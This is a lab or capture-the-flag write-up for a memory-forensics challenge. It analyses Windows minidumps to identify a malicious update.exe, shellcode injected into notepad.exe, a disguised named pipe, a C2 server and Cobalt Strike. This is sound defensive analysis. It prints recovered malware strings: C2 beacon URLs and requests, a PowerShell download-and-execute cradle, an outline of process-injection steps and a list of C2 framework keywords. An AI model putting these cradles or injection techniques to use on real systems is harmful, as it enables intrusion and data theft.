# Memory Forensics Week 14 Challenge: Analyzing Windows Minidumps on Linux

## I was provided with two minidumps that I needed to analys and answer the following questions:

1/ Provide the operating system version.

2/ Provide the full path of the malicious executable used to gain initial access.

3/ How many threads did the malicious process use?

4/ Provide the named pipe (IPC channel) used by the malicious process.

5/ Provide the PID of the injected process. Provide the Answer in decimal.

6/ At what time was the last thread created for the injected process? Provide the timestamp in UTC.

7/ Provide the BaseAddress of the injected shellcode.

8/ Provide the C2 server IP address.

9/ Provide the name of the C2 framework used by the threat actor.

### What is a minidump?

A minidump is a compressed snapshot of a process's memory, threads, handles, and loaded modules at a specific point in time, typically captured for debugging or forensic analysis. They don't only exist on Windows, but the formal MINIDUMP format is Windows-specific. On Linux they're usually refereed to as core dumps (look up magnetic core memory for why they're called that).

## Prerequisites

```bash
# Install the minidump parser
pip install minidump

# Or
paru -S python-minidump

# Verify installation
python3 -m minidump --help

# Both dumps are present
ls *.DMP
notepad.DMP
update.DMP
```

## Q1: Operating System Version

**Command:**

```bash
python3 -m minidump notepad.DMP --sysinfo
```

**What to look for:** The MajorVersion, MinorVersion, and BuildNumber fields.

Expected output:

```bash
== System Info ==
ProcessorArchitecture PROCESSOR_ARCHITECTURE.AMD64
OperatingSystem -guess- Windows 10 - 1507
MajorVersion 10
MinorVersion 0
BuildNumber 10240
ProductType PRODUCT_TYPE.VER_NT_WORKSTATION
```

**Answer:** Windows 10, Build 10240 (Version 1507)

**How it works:** The --sysinfo flag parses the MINIDUMP_SYSTEM_INFO stream from the minidump header. This stream is populated at dump creation time from the Windows OS version information API. Build 10240 is the original Windows 10 RTM release.

## Q2: Full Path of the Malicious Executable

**Command:**

```bash
python3 -m minidump update.DMP --peb
```

**What to look for:** The ImagePath field.

Expected output:

```bash
PEB ADDR: 0x7ff5ffff6000
ImageBaseAddress: 0x400000
ImagePath: C:\Users\s1rx\Downloads\update.exe
CommandLine: "C:\Users\s1rx\Downloads\update.exe"
```

**Answer:** C:\Users\s1rx\Downloads\update.exe

**How it works:** The --peb flag parses the Process Environment Block (PEB), a kernel-mode data structure Windows creates for every process. The PEB contains the ImagePathName field, which holds the full executable path. Compare this against notepad.DMP --peb which shows C:\Windows\system32\notepad.exe (a legitimate Windows binary). The suspicious path in the user's Downloads folder identifies update.exe as the malicious payload.

**Verification command:**

```bash
# Compare both dumps to identify which is malicious
python3 -m minidump notepad.DMP --peb | grep ImagePath
python3 -m minidump update.DMP --peb | grep ImagePath
```

## Q3: Number of Threads Used by the Malicious Process

**Command:**

```bash
python3 -m minidump update.DMP --threads
```

**What to look for:** Count the thread entries in the ThreadList section.

**Expected output:**

```bash
ThreadList
ThreadId | SuspendCount | PriorityClass | Priority | Teb           
-------------------------------------------------------------------
0xbdc    | 0            | 32            | 0        | 0x7ff5ffffd000
0x3ec    | 0            | 32            | 0        | 0x7ff5ffff9000
0xa14    | 0            | 32            | 0        | 0x7ff5ffff7000
0xe30    | 0            | 32            | 0        | 0x7ff5ffff4000
0x448    | 0            | 32            | 0        | 0x7ff5ffffb000
0x8      | 0            | 32            | 0        | 0x7ff5ffece000
```

**Answer:** 6

How it works: The --threads flag parses the ThreadListStream from the minidump. Each row represents one thread. Since we confirmed update.exe is the malicious executable in Q2, we count its threads (6) rather than notepad's (4).

## Q4: Named Pipe (IPC Channel) Used by the Malicious Process

**Commands:**

```bash
# Escape each backslash (regex mode)
strings update.DMP | grep -i '\\\\.\\\\pipe\\\\' | sort -u
```

**Expected output**

```bash
\pipe\epmapper
\\.\pipe\MSSE-1641-server
```

**Answer:** \\.\pipe\MSSE-1641-server

**How it works:** It searches the raw process memory (extracted via strings) for the Windows named pipe naming convention \\.\pipe\<name>. The \\.\pipe\MSSE-1641-server pipe is exclusive to update.DMP (it does not appear in notepad.DMP), confirming it belongs to the malicious process. The MSSE-1641-server naming pattern mimics Microsoft Security Essentials.

**Verification command:**

```bash
❯ strings notepad.DMP | grep -Fi '\pipe' | sort -u > /tmp/notepad_pipes.txt
  strings update.DMP | grep -Fi '\pipe' | sort -u > /tmp/update_pipes.txt
  diff /tmp/notepad_pipes.txt /tmp/update_pipes.txt
```

## Q5: PID of the Injected Process (Decimal)

**Commands:**

```bash
# First, confirm which process is the injected target by checking thread start addresses
python3 -m minidump notepad.DMP --threads

# ...adn comparing it to the process start addresses
python3 -m minidump notepad.DMP --peb
```

**Expected output:**

```bash
== ThreadInfoList ==
ThreadId | DumpFlags | DumpError | ExitStatus | CreateTime         | ExitTime | KernelTime | UserTime | StartAddress   | Affinity
---------------------------------------------------------------------------------------------------------------------------------
0xc28    | None      | 0         | 0x103      | 134067782862955057 | 0        | 0          | 0        | 0x7ff78dc23fe0 | 1       
0x3a8    | None      | 0         | 0x103      | 134067785528254725 | 0        | 0          | 156250   | 0xb120870000   | 1       
0x5fc    | None      | 0         | 0x103      | 134067785528582583 | 0        | 0          | 0        | 0x7fff47309040 | 1       
0x2d0    | None      | 0         | 0x103      | 134067785529312861 | 0        | 0          | 0        | 0x7fff47309040 | 1       

PEB ADDR: 0x7ff78d766000
BeingDebugged: 0
ImageBaseAddress: 0x7ff78dc10000
ProcessParameters: None
ImagePath: C:\Windows\system32\notepad.exe
CommandLine: "C:\Windows\system32\notepad.exe" 
```

Notice that threads 0x3a8, 0x5fc, and 0x2d0 have start addresses (0xb120870000, 0x7fff47309040) that fall outside notepad's image base (0x7ff78dc10000). These are injected threads.

**Then get the PID:**

```bash
python3 -m minidump notepad.DMP --misc
```

**Expected output:**

```bash
== MinidumpMiscInfo ==
ProcessId 2336
ProcessCreateTime 1762304686
ProcessUserTime 0
ProcessKernelTime 0
```

**Answer:** 2336

**How it works:** The --misc flag parses the MINIDUMP_MISC_INFO stream, which contains the process ID (ProcessId field). We identify notepad.exe as the injected process because three of its four threads have start addresses pointing to memory regions outside the notepad image base (0x7ff78dc10000).

**Why Notepad Normally Wouldn't Have Extra Threads**

Notepad is a simple text editor. A clean notepad.exe process typically has one thread (the main GUI thread). Finding four threads, with three pointing to foreign memory regions, is strong evidence that:

***Someone allocated new executable memory inside notepad's address space. They created threads that begin executing from that foreign memory***
    
**How Normal Threads Work**

***When Windows launches a process like notepad.exe, it Loads the executable into memory at the image base (0x7ff78dc10000). Creates the main thread with a StartAddress pointing into that image (typically the entry point, e.g. 0x7ff78dc23fe0, which sits ~0x13FE0 bytes into the image). Any subsequent legitimate threads (created by notepad itself) also have StartAddress values pointing into loaded DLLs or the notepad image, all within known, mapped regions***

**The key principle:** legitimate threads start execution from code that lives in legitimately loaded modules (MEM_IMAGE regions).

**What Injection Changes**

When an attacker injects code into a process, they typically:

***Allocate new memory inside the victim process using VirtualAllocEx with PAGE_EXECUTE_READWRITE***

***Write shellcode or a DLL into that newly allocated region***

***Create a thread (via CreateRemoteThread or similar) with StartAddress pointing to that injected memory***

**The result:** the new thread's StartAddress points to a MEM_PRIVATE region, completely separate from the process's normal image base and loaded DLLs.

## Q6: Last Thread Creation Time for the Injected Process (UTC)

**Command:**

```bash
python3 -m minidump notepad.DMP --threads
```

**What to look for:** The CreateTime field in the ThreadInfoList section. Find the largest (most recent) value.

**Expected output (sorted by CreateTime):**

```bash
ThreadId | ... | CreateTime         
------------------------------------
0xc28    | ... | 134067782862955057  (earliest - notepad's main thread)
0x3a8    | ... | 134067785528254725
0x5fc    | ... | 134067785528582583
0x2d0    | ... | 134067785529312861  (latest - last thread created)
```

**Convert the FILETIME to UTC:**

```bash
python3 -c "
  import datetime

  # Last thread CreateTime from notepad.DMP
  filetime = 134067785529312861

  # Windows FILETIME is 100-nanosecond intervals since January 1, 1601 UTC
  epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
  result = epoch + datetime.timedelta(microseconds=filetime / 10)
  print('Last thread creation time:', result.strftime('%Y-%m-%d %H:%M:%S UTC'))
  "
Last thread creation time: 2025-11-05 01:09:12 UTC
```

**Answer:** 2025-11-05 01:09:12 UTC

**How it works:** Windows stores thread creation times as FILETIME values, which are 100-nanosecond intervals since January 1, 1601 UTC. The --threads flag exposes these raw values in the ThreadInfoList section. We identify the most recent (largest) CreateTime value and convert it using Python's datetime module. We use notepad.DMP (not update.DMP) because Q6 asks about the injected process, which we identified as notepad.exe (PID 2336) in Q5.

## Q7: BaseAddress of the Injected Shellcode

**Command:**

```bash
python3 -m minidump notepad.DMP --memory
```

***What to look for:*** In the MinidumpMemoryInfoList section, find entries with PAGE_EXECUTE_READWRITE protection and MEM_PRIVATE type.

**Expected output (filtered):**

```bash
BaseAddress    | AllocationBase | AllocationProtect | RegionSize  | State       | Protect                | Type       
-------------------------------------------------------------------------------------------------------------------------
0xb120870000   | 0xb120870000   | 64               | 0x1000      | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
0xb1221a0000   | 0xb1221a0000   | 64               | 0x4e000     | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
0xb123bd0000   | 0xb123bd0000   | 64               | 0x400000    | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
```bash

**Filter command to isolate RWX regions:**

```bash
python3 -m minidump notepad.DMP --memory | grep "PAGE_EXECUTE_READWRITE" | grep "MEM_PRIVATE"
0xb120870000   | 0xb120870000   | 64                | 0x1000         | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
0xb1221a0000   | 0xb1221a0000   | 64                | 0x4e000        | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
0xb123bd0000   | 0xb123bd0000   | 64                | 0x400000       | MEM_COMMIT  | PAGE_EXECUTE_READWRITE | MEM_PRIVATE
```

**Answer:** 0xb120870000

How it works: The --memory flag parses the MINIDUMP_MEMORY_INFO_LIST stream, which describes the virtual memory layout of the process. Each entry shows the BaseAddress, AllocationBase, protection flags (Protect), state (State), and type (Type). Legitimate code sections in a Windows process use MEM_IMAGE type with PAGE_EXECUTE_READ protection. Injected shellcode typically uses MEM_PRIVATE type with PAGE_EXECUTE_READWRITE (RWX) protection, because the attacker allocated memory with VirtualAllocEx using PAGE_EXECUTE_READWRITE.

Three RWX private regions exist. The smallest (0xb120870000, 4KB) is the shellcode stub. This is confirmed by cross-referencing with the thread data from Q5: thread 0x3a8 has StartAddress: 0xb120870000, proving the injected thread begins execution at this address.

## Q8: C2 Server IP Address

**Commands:**

```bash
# Method 1: Extract URL patterns to find C2 endpoints
strings update.DMP | grep -oE "https?://[^ \"'<>]+" | sort -u | grep -v "microsoft\|w3\.org\|bing\|passport\|modern\.ie"

# Method 2: Get context around candidate IPs to confirm C2 communication
strings update.DMP | grep -B2 -A2 "101.10.25.4"
```

**Expected output (Method 1):**

```bash
http://101.10.25.4:8023/j.ad
http://101.10.25.4:8023/submit.php?id=2080607144
```

**Expected output (Method 2):**

```bash
Cookie: GdZd3Wqvq2keF0QKl2bP6T+QQijxNJjhbbbacZDivNla...
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
Host: 101.10.25.4:8023
Connection: Keep-Alive
Cache-Control: no-cache
```

**Answer:** 101.10.25.4

**How it works:** Often the C2 configuration is encrypted in memory, so the IP may not appear as a standalone string. However, the beacon constructs HTTP requests at runtime, and those request strings remain in process memory. Method 1 is precise: it extracts full URLs, which reveal the C2 IP along with the port and URI path. Method 2 provides surrounding context (HTTP headers, cookies, User-Agent) to confirm the IP is actively used for C2 communication.

The attacker used two ports: port 8023 for the initial beacon from update.exe, and port 8891 for communications from the injected notepad.exe (visible in notepad.DMP strings).

```bash
strings notepad.DMP | grep -oE "https?://[^ \"'<>]+" | grep ":8891" | sort -u
http://101.10.25.4:8891/ca
http://101.10.25.4:8891/submit.php?id=1019752184
http://101.10.25.4:8891/w2pD
```

```bash
strings notepad.DMP | grep -B2 -A2 "8891"
http://101.10.25.4:8891/submit.php?id=1019752184
...
GET /w2pD HTTP/1.1
Host101.10.25.4:8891GET /w2pD HTTP/1.1s
ConnectionKeep-Alive
...
POST /submit.php?id=1019752184 HTTP/1.1
Content-Typeapplication/octet-stream
Host101.10.25.4:8891
```

This shows the injected notepad.exe beacon communicating with the same C2 IP (101.10.25.4) but on a different port (8891) using three URI paths:

| URI Path | HTTP Method | Purpose |
|----------|-------------|---------|
| `/w2pD` | GET | Beacon check-in / task polling |
| `/submit.php?id=1019752184` | POST | Data exfiltration / results submission |
| `/ca` | GET | Command acknowledgment |


## Q9: C2 Framework Used by the Threat Actor

**Commands:**

```bash
# Method 1: Search for known C2 framework signatures
strings update.DMP | grep -ioE "cobalt|beacon|meterpreter|sliver|empire|havoc|covenant|merlin|brute|ratel" | sort -u

# Method 2: Confirm via named pipe pattern (from Q4)
strings update.DMP | grep -Fi '\pipe' | sort -u

# Method 3: Search for C2-related artifacts
strings update.DMP | grep -iE "http|https|connect|beacon|server" | grep -v "microsoft\|windows\|registry" | head -30
```

**Expected output (Method 1):**

```bash
beacon
rateL
```

**Expected output (Method 2):**

```bash
\pipe\epmapper
\\.\pipe\MSSE-1641-server
```

**Expected output (Method 3):**

```bash
winhttp.pdb
beacon.dll
Could not connect to pipe (%s): %d
Could not connect to pipe: %d
could not connect to pipe: %d
could not connect to pipe
Maximum links reached. Disconnect one
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s
HTTP/1.1 200 OK
DisconnectNamedPipe
ConnectNamedPipe
InternetConnectA
HttpOpenRequestA
HttpAddRequestHeadersA
HttpSendRequestA
HttpQueryInfoA
beacon.x64.dll
LOGONSERVER=\\DESKTOP-TIT3D2T
beacon.dll
Could not connect to pipe (%s): %d
Could not connect to pipe: %d
could not connect to pipe: %d
could not connect to pipe
Maximum links reached. Disconnect one
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s
HTTP/1.1 200 OK
DisconnectNamedPipe
ConnectNamedPipe
```

**Answer:** Cobalt Strike

**How it works:** Four independent indicators converge on Cobalt Strike:

**Beacon DLL names:** The strings beacon.dll and beacon.x64.dll are the Cobalt Strike beacon payload filenames. These are loaded into the injected process memory.

**Named pipe convention:** The \\.\pipe\MSSE-1641-server pipe follows Cobalt Strike's known pipe naming pattern. Cobalt Strike uses named pipes for SMB beacon communication and commonly disguises them with names mimicking Microsoft Security Essentials (MSSE-<number>-server).

**PowerShell cradle pattern:** The string IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/') is a Cobalt Strike PowerShell inject pattern used for executing PowerShell commands through the beacon without writing to disk. The 127.0.0.1:%u local loopback pattern is characteristic of Cobalt Strike's powerpick and execute-assembly commands.

**C2 URI patterns:** The URIs /j.ad, /ca, and /submit.php match Cobalt Strike's configurable beacon HTTP profile for check-in, command acknowledgment, and data submission.

    
**Why These Nine Specifically?** 

**1. Market Dominance**

These cover 90%+ of active C2 deployments in breach investigations. According to Mandiant and CrowdStrike threat reports, Cobalt Strike alone appears in 50-70% of nation-state and ransomware campaigns.

**2. Distinctive Artifacts**

Each framework leaves recognizable signatures in:

    Process memory (DLL names, strings, config blobs)
    Network traffic (protocol patterns, TLS fingerprints)
    File systems (config files, loaders, droppers)
    Registry (persistence mechanisms)
    Named pipes (communication channels)

---

## Cross-Dump Correlation Summary

```bash
echo "=== Q1: OS Version ==="
python3 -m minidump update.DMP --sysinfo | grep -E "MajorVersion|MinorVersion|BuildNumber"

echo -e "\n=== Q2: Executable Path ==="
python3 -m minidump update.DMP --peb | grep "ImagePath"

echo -e "\n=== Q3: Thread Count ==="
python3 -m minidump update.DMP --threads | awk '/== ThreadInfoList/{exit} /^0x/{count++} END{print count}'

echo -e "\n=== Q4: Named Pipe ==="
strings update.DMP | grep -Fi '\pipe' | sort -u

echo -e "\n=== Q5: Injected PID ==="
python3 -m minidump notepad.DMP --misc | grep "ProcessId"

echo -e "\n=== Q6: Last Thread Time ==="
python3 -c "
import datetime, subprocess
output = subprocess.check_output(['python3', '-m', 'minidump', 'notepad.DMP', '--threads'], text=True)
max_time = 0
for line in output.split('\n'):
    parts = [p.strip() for p in line.split('|')]
    if len(parts) >= 5 and parts[4].isdigit():
        create_time = int(parts[4])
        if create_time > max_time:
            max_time = create_time
epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
result = epoch + datetime.timedelta(microseconds=max_time / 10)
print(f'Last thread creation time: {result.strftime(\"%Y-%m-%d %H:%M:%S UTC\")}')
"

echo -e "\n=== Q7: Shellcode BaseAddress ==="
python3 -m minidump notepad.DMP --memory | grep "PAGE_EXECUTE_READWRITE" | grep "MEM_PRIVATE" | head -1

echo -e "\n=== Q8: C2 IP ==="
strings update.DMP | grep -oE "https?://[0-9][^ \"'<>]+" | grep -v "microsoft\|w3\|bing\|passport\|modern\|test\.com\|127\.0\.0\.1\|%s" | sort -u

echo -e "\n=== Q9: C2 Framework ==="
strings update.DMP | grep -ioE "cobalt|beacon|meterpreter|sliver|empire|havoc|covenant|merlin|brute|ratel" | sort -u
```


